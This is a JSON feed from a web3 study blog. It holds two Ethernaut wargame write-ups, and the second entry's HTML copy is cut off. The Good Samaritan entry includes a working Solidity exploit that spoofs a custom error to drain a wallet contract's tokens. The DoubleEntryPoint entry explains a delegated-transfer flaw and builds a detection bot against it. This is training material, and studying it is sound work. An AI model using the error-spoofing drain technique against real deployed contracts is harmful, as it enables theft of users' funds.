{
    "version": "https://jsonfeed.org/version/1",
    "title": "0o3q",
    "home_page_url": "https://0o3q.github.io/",
    "feed_url": "https://0o3q.github.io/feed.json",
    "description": "studying web3",
    "icon": "https://0o3q.github.io/apple-touch-icon.png",
    "favicon": "https://0o3q.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "0o3q",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://0o3q.github.io/2026/01/20/good-samaritan",
            "title": "[Ethernaut] 27.Good Samaritan",
            "summary": null,
            "content_text": "AnalysisThe goal is “drain all the balance from Good Samaritan’s **Wallet”.// SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import \"openzeppelin-contracts-08/utils/Address.sol\";contract GoodSamaritan {    Wallet public wallet;    Coin public coin;    constructor() {        wallet = new Wallet();        coin = new Coin(address(wallet));        wallet.setCoin(coin);    }    function requestDonation() external returns (bool enoughBalance) {        // donate 10 coins to requester        try wallet.donate10(msg.sender) {            return true;        } catch (bytes memory err) {            if (keccak256(abi.encodeWithSignature(\"NotEnoughBalance()\")) == keccak256(err)) {                // send the coins left                wallet.transferRemainder(msg.sender);                return false;            }        }    }}contract Coin {    using Address for address;    mapping(address =&gt; uint256) public balances;    error InsufficientBalance(uint256 current, uint256 required);    constructor(address wallet_) {        // one million coins for Good Samaritan initially        balances[wallet_] = 10 ** 6;    }    function transfer(address dest_, uint256 amount_) external {        uint256 currentBalance = balances[msg.sender];        // transfer only occurs if balance is enough        if (amount_ &lt;= currentBalance) {            balances[msg.sender] -= amount_;            balances[dest_] += amount_;            if (dest_.isContract()) {                // notify contract                INotifyable(dest_).notify(amount_);            }        } else {            revert InsufficientBalance(currentBalance, amount_);        }    }}contract Wallet {    // The owner of the wallet instance    address public owner;    Coin public coin;    error OnlyOwner();    error NotEnoughBalance();    modifier onlyOwner() {        if (msg.sender != owner) {            revert OnlyOwner();        }        _;    }    constructor() {        owner = msg.sender;    }    function donate10(address dest_) external onlyOwner {        // check balance left        if (coin.balances(address(this)) &lt; 10) {            revert NotEnoughBalance();        } else {            // donate 10 coins            coin.transfer(dest_, 10);        }    }    function transferRemainder(address dest_) external onlyOwner {        // transfer balance left        coin.transfer(dest_, coin.balances(address(this)));    }    function setCoin(Coin coin_) external onlyOwner {        coin = coin_;    }}interface INotifyable {    function notify(uint256 amount) external;}GoodSamaritan Contract: Enables users to request a donation of 10 tokens via the requestDonation() function.Coin Contract: Mints an initial supply of 10 ** 6 tokens and manages token transfer functionality.Wallet Contract: Handles the execution of the 10 token donation and supports transferring the entire remaining token balance.ExploitInvoking requestDonation() initiates the following call chain: wallet.donate10()-&gt; coin.transfer().Within coin.transfer(), if the destination address (dest_) is a contract, it invokes INotifyable(dest_).notify().Since this is defined as an interface, the destination contract can implement arbitrary logic within this callback.If a NotEnoughBalance() error occurs during requestDonation(), the error handling logic triggers wallet.transferRemainder(), which transfers the entire remaining token balance.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GoodSamaritan.sol\";import \"forge-std/Script.sol\";contract Ex {    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);    error NotEnoughBalance();    function notify(uint256 amount) external {        if(amount == 10) revert NotEnoughBalance();    }    function ex() public {        gs_.requestDonation();    }}contract GoodSamaritanSol is Script {    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);    function run() external {        vm.startBroadcast();            Ex ex_ = new Ex();        ex_.ex();        console.log(gs_.coin().balances(address(gs_.wallet())));        vm.stopBroadcast();    }}",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “drain all the balance from Good Samaritan’s <em>**</em>Wallet”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">&gt;=</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span> <span class=\"o\">&lt;</span><span class=\"mf\">0.9</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/utils/Address.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GoodSamaritan</span> <span class=\"p\">{</span>    <span class=\"n\">Wallet</span> <span class=\"k\">public</span> <span class=\"n\">wallet</span><span class=\"p\">;</span>    <span class=\"n\">Coin</span> <span class=\"k\">public</span> <span class=\"n\">coin</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">wallet</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Wallet</span><span class=\"p\">();</span>        <span class=\"n\">coin</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Coin</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">wallet</span><span class=\"p\">));</span>        <span class=\"n\">wallet</span><span class=\"p\">.</span><span class=\"n\">setCoin</span><span class=\"p\">(</span><span class=\"n\">coin</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">requestDonation</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">enoughBalance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"c1\">// donate 10 coins to requester</span>        <span class=\"k\">try</span> <span class=\"n\">wallet</span><span class=\"p\">.</span><span class=\"n\">donate10</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">catch</span> <span class=\"p\">(</span><span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"NotEnoughBalance()\"</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">err</span><span class=\"p\">))</span> <span class=\"p\">{</span>                <span class=\"c1\">// send the coins left</span>                <span class=\"n\">wallet</span><span class=\"p\">.</span><span class=\"n\">transferRemainder</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>                <span class=\"k\">return</span> <span class=\"nb\">false</span><span class=\"p\">;</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Coin</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">Address</span> <span class=\"k\">for</span> <span class=\"kt\">address</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"n\">error</span> <span class=\"n\">InsufficientBalance</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">current</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">required</span><span class=\"p\">);</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">wallet_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"c1\">// one million coins for Good Samaritan initially</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">wallet_</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">10</span> <span class=\"o\">**</span> <span class=\"mi\">6</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">dest_</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">currentBalance</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>        <span class=\"c1\">// transfer only occurs if balance is enough</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">amount_</span> <span class=\"o\">&lt;=</span> <span class=\"n\">currentBalance</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">amount_</span><span class=\"p\">;</span>            <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">dest_</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">amount_</span><span class=\"p\">;</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">dest_</span><span class=\"p\">.</span><span class=\"n\">isContract</span><span class=\"p\">())</span> <span class=\"p\">{</span>                <span class=\"c1\">// notify contract</span>                <span class=\"n\">INotifyable</span><span class=\"p\">(</span><span class=\"n\">dest_</span><span class=\"p\">).</span><span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"n\">amount_</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span> <span class=\"n\">InsufficientBalance</span><span class=\"p\">(</span><span class=\"n\">currentBalance</span><span class=\"p\">,</span> <span class=\"n\">amount_</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Wallet</span> <span class=\"p\">{</span>    <span class=\"c1\">// The owner of the wallet instance</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"n\">Coin</span> <span class=\"k\">public</span> <span class=\"n\">coin</span><span class=\"p\">;</span>    <span class=\"n\">error</span> <span class=\"n\">OnlyOwner</span><span class=\"p\">();</span>    <span class=\"n\">error</span> <span class=\"n\">NotEnoughBalance</span><span class=\"p\">();</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">owner</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span> <span class=\"n\">OnlyOwner</span><span class=\"p\">();</span>        <span class=\"p\">}</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">donate10</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">dest_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"c1\">// check balance left</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">coin</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">))</span> <span class=\"o\">&lt;</span> <span class=\"mi\">10</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span> <span class=\"n\">NotEnoughBalance</span><span class=\"p\">();</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"c1\">// donate 10 coins</span>            <span class=\"n\">coin</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">dest_</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">transferRemainder</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">dest_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"c1\">// transfer balance left</span>        <span class=\"n\">coin</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">dest_</span><span class=\"p\">,</span> <span class=\"n\">coin</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">setCoin</span><span class=\"p\">(</span><span class=\"n\">Coin</span> <span class=\"n\">coin_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">coin</span> <span class=\"o\">=</span> <span class=\"n\">coin_</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">interface</span> <span class=\"n\">INotifyable</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span></code></pre></div></div><p><strong>GoodSamaritan Contract:</strong> Enables users to request a donation of 10 tokens via the <code class=\"language-plaintext highlighter-rouge\">requestDonation()</code> function.</p><p><strong>Coin Contract:</strong> Mints an initial supply of <code class=\"language-plaintext highlighter-rouge\">10 ** 6</code> tokens and manages token transfer functionality.</p><p>Wallet Contract: Handles the execution of the 10 token donation and supports transferring the entire remaining token balance.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>Invoking <code class=\"language-plaintext highlighter-rouge\">requestDonation()</code> initiates the following call chain: <code class=\"language-plaintext highlighter-rouge\">wallet.donate10()</code>-&gt; <code class=\"language-plaintext highlighter-rouge\">coin.transfer()</code>.</p><p>Within <code class=\"language-plaintext highlighter-rouge\">coin.transfer()</code>, if the destination address (<code class=\"language-plaintext highlighter-rouge\">dest_</code>) is a contract, it invokes <code class=\"language-plaintext highlighter-rouge\">INotifyable(dest_).notify()</code>.</p><p>Since this is defined as an interface, the destination contract can implement arbitrary logic within this callback.</p><p>If a <code class=\"language-plaintext highlighter-rouge\">NotEnoughBalance()</code> error occurs during <code class=\"language-plaintext highlighter-rouge\">requestDonation()</code>, the error handling logic triggers <code class=\"language-plaintext highlighter-rouge\">wallet.transferRemainder()</code>, which transfers the entire remaining token balance.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GoodSamaritan.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"n\">GoodSamaritan</span> <span class=\"k\">public</span> <span class=\"n\">gs_</span> <span class=\"o\">=</span> <span class=\"n\">GoodSamaritan</span><span class=\"p\">(</span><span class=\"mh\">0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0</span><span class=\"p\">);</span>    <span class=\"n\">error</span> <span class=\"n\">NotEnoughBalance</span><span class=\"p\">();</span>    <span class=\"k\">function</span> <span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">amount</span> <span class=\"o\">==</span> <span class=\"mi\">10</span><span class=\"p\">)</span> <span class=\"nb\">revert</span> <span class=\"n\">NotEnoughBalance</span><span class=\"p\">();</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">gs_</span><span class=\"p\">.</span><span class=\"n\">requestDonation</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GoodSamaritanSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GoodSamaritan</span> <span class=\"k\">public</span> <span class=\"n\">gs_</span> <span class=\"o\">=</span> <span class=\"n\">GoodSamaritan</span><span class=\"p\">(</span><span class=\"mh\">0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>            <span class=\"n\">Ex</span> <span class=\"n\">ex_</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex_</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"n\">gs_</span><span class=\"p\">.</span><span class=\"n\">coin</span><span class=\"p\">().</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">gs_</span><span class=\"p\">.</span><span class=\"n\">wallet</span><span class=\"p\">())));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div>",
            "url": "https://0o3q.github.io/2026/01/20/good-samaritan",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","selector"],
            
            "date_published": "2026-01-20T00:00:00+09:00",
            "date_modified": "2026-01-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/19/doubleentrypoint",
            "title": "[Ethernaut] 26.DoubleEntryPoint",
            "summary": null,
            "content_text": "AnalysisThe goal is to figure out where the bug is in CryptoVault and protect it from being drained of tokens. by implementing a detection bot and registering it in the Forta contract.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/access/Ownable.sol\";import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";interface DelegateERC20 {    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);}interface IDetectionBot {    function handleTransaction(address user, bytes calldata msgData) external;}interface IForta {    function setDetectionBot(address detectionBotAddress) external;    function notify(address user, bytes calldata msgData) external;    function raiseAlert(address user) external;}contract Forta is IForta {    mapping(address =&gt; IDetectionBot) public usersDetectionBots;    mapping(address =&gt; uint256) public botRaisedAlerts;    function setDetectionBot(address detectionBotAddress) external override {        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);    }    function notify(address user, bytes calldata msgData) external override {        if (address(usersDetectionBots[user]) == address(0)) return;        try usersDetectionBots[user].handleTransaction(user, msgData) {            return;        } catch {}    }    function raiseAlert(address user) external override {        if (address(usersDetectionBots[user]) != msg.sender) return;        botRaisedAlerts[msg.sender] += 1;    }}contract CryptoVault {    address public sweptTokensRecipient;    IERC20 public underlying;    constructor(address recipient) {        sweptTokensRecipient = recipient;    }    function setUnderlying(address latestToken) public {        require(address(underlying) == address(0), \"Already set\");        underlying = IERC20(latestToken);    }    /*    ...    */    function sweepToken(IERC20 token) public {        require(token != underlying, \"Can't transfer underlying token\");        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));    }}contract LegacyToken is ERC20(\"LegacyToken\", \"LGT\"), Ownable {    DelegateERC20 public delegate;    function mint(address to, uint256 amount) public onlyOwner {        _mint(to, amount);    }    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {        delegate = newContract;    }    function transfer(address to, uint256 value) public override returns (bool) {        if (address(delegate) == address(0)) {            return super.transfer(to, value);        } else {            return delegate.delegateTransfer(to, value, msg.sender);        }    }}contract DoubleEntryPoint is ERC20(\"DoubleEntryPointToken\", \"DET\"), DelegateERC20, Ownable {    address public cryptoVault;    address public player;    address public delegatedFrom;    Forta public forta;    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {        delegatedFrom = legacyToken;        forta = Forta(fortaAddress);        player = playerAddress;        cryptoVault = vaultAddress;        _mint(cryptoVault, 100 ether);    }    modifier onlyDelegateFrom() {        require(msg.sender == delegatedFrom, \"Not legacy contract\");        _;    }    modifier fortaNotify() {        address detectionBot = address(forta.usersDetectionBots(player));        // Cache old number of bot alerts        uint256 previousValue = forta.botRaisedAlerts(detectionBot);        // Notify Forta        forta.notify(player, msg.data);        // Continue execution        _;        // Check if alarms have been raised        if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(\"Alert has been triggered, reverting\");    }    function delegateTransfer(address to, uint256 value, address origSender)        public        override        onlyDelegateFrom        fortaNotify        returns (bool)    {        _transfer(origSender, to, value);        return true;    }}The Forta Contract allows registering a bot to raise alerts.The CryptoVault Contract can sweep tokens if the specific token is not the underlying. Additionally, the code comments in the CryptoVault Contract are empty.The LegacyToken Contract minted LGT token and delegated logic to the DoubleEntryPoint Contract.The DoubleEntryPoint Contract minted DET token and can manage transfer delegation by utilizing a forta bot.ExploitInspecting the instance address on Etherscan reveals the addresses fot the LegactToken, CryptoValut and Forta Contract.The Constructor arguments for the DoubleEntryPoint Contract are ordered as follows: LegacyToken, CryptoVault, Forta and player.To verify the address checksum, use the following command:cast --to-checksum-address &lt;address&gt;We should identify the vulnerability in the CryptoVault contract.The sweepToken() function is publicly callable and verifies that the requested token is not the underlying .However, sweeping the LegacyToken(LGT token) bypasses this protection.While the function validates the LGT address the actual transfer logic is delegated to the DoubleEntryPoint Contract, resulting in the unintended transfer of DET Token .The notify() function in the Forta Contract executes handleTransaction(), which can be implemented with custom logic.The delegateTransfer() function calls include the origSender argument. Therfore, by verifying if origSender matches the CryptoVault address, the bot can prevent DET Token from being drained.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/DoubleEntryPoint.sol\";import \"forge-std/Script.sol\";contract Bot is IDetectionBot {    Forta public forta_ = Forta(0x8d38A390959fAb2BF008bA6E49aF8Eb3D19E24d7);    CryptoVault public cv_ = CryptoVault(0x1ee6F5EC79B4f94862B3839D7Eb661bAcf79f2e1);    function handleTransaction(address user, bytes calldata msgData) external override {        (,, address origSender) = abi.decode(msgData[4:], (address, uint256, address));        if (origSender == address(cv_)) {            forta_.raiseAlert(user);        }    }}contract DoubleEntryPointSol is Script {    Forta public forta_ = Forta(0x8d38A390959fAb2BF008bA6E49aF8Eb3D19E24d7);    CryptoVault public cv_ = CryptoVault(0x1ee6F5EC79B4f94862B3839D7Eb661bAcf79f2e1);    LegacyToken public lt_ = LegacyToken(0x3E847B9aE7613A08c1d8c8E52212e119903312CA);    function run() external {        vm.startBroadcast();        Bot bot = Bot(address(new Bot()));        forta_.setDetectionBot(address(bot));        vm.stopBroadcast();    }}",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is to figure out where the bug is in <code class=\"language-plaintext highlighter-rouge\">CryptoVault</code> and protect it from being drained of tokens. by implementing a <code class=\"language-plaintext highlighter-rouge\">detection bot</code> and registering it in the <code class=\"language-plaintext highlighter-rouge\">Forta</code> contract.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/access/Ownable.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">DelegateERC20</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">delegateTransfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">origSender</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"k\">interface</span> <span class=\"n\">IDetectionBot</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">handleTransaction</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">msgData</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">interface</span> <span class=\"n\">IForta</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">setDetectionBot</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">detectionBotAddress</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">msgData</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">raiseAlert</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Forta</span> <span class=\"k\">is</span> <span class=\"n\">IForta</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"n\">IDetectionBot</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">usersDetectionBots</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">botRaisedAlerts</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">setDetectionBot</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">detectionBotAddress</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">override</span> <span class=\"p\">{</span>        <span class=\"n\">usersDetectionBots</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">IDetectionBot</span><span class=\"p\">(</span><span class=\"n\">detectionBotAddress</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">msgData</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">override</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">usersDetectionBots</span><span class=\"p\">[</span><span class=\"n\">user</span><span class=\"p\">])</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"k\">return</span><span class=\"p\">;</span>        <span class=\"k\">try</span> <span class=\"n\">usersDetectionBots</span><span class=\"p\">[</span><span class=\"n\">user</span><span class=\"p\">].</span><span class=\"n\">handleTransaction</span><span class=\"p\">(</span><span class=\"n\">user</span><span class=\"p\">,</span> <span class=\"n\">msgData</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"k\">return</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">catch</span> <span class=\"p\">{}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">raiseAlert</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">)</span> <span 